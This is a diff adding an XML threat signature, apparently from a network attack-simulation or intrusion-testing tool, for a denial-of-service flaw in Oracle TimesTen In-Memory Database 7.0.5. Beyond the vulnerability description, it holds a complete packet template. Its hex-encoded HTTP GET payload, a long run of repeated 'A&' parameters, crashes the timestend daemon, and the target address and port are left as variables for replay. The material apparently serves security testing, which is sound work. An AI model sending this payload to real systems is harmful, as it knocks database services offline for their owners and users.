@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Oracle TimesTen In-Memory Database HTTP Request Denial of Service"/>
+    <EngDesc display="true" value="A denial of service vulnerability exists in Oracle TimesTen In-Memory Database service. The vulnerability is due to an input validation error while parsing HTTP GET requests. Remote unauthenticated attackers can exploit this vulnerability by sending a specially crafted HTTP request to the timestend daemon listening on port 17000/TCP. Successful exploitation would cause the database service to terminate abnormally, resulting in the Denial of Service condition."/>
+    <Intent display="true">
+      <item value="Denial_Of_Service/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Database"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Oracle"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Oracle_TimesTen_In-Memory_Database"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Oracle_TimesTen_In-Memory_Database_7.0.5"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="8c0d7232672427fd144fee01d9a75181"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634027104595748849"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1267093808" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:CC:16:65" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0374" Identification="1AF5" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="BAF2" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="55906" destPort="$HTTPdestPort" SeqNumber="85FE5084" AckNumber="ECD42F24" HeaderLength="08" WindowSize="002E" Checksum="0B32" UrgentPointer="0000" Options="0101080AAB3D4A7800000000" Payload="4745542068656C6C6F3F4126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126412641264126414141413D4141414120485454502F312E300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
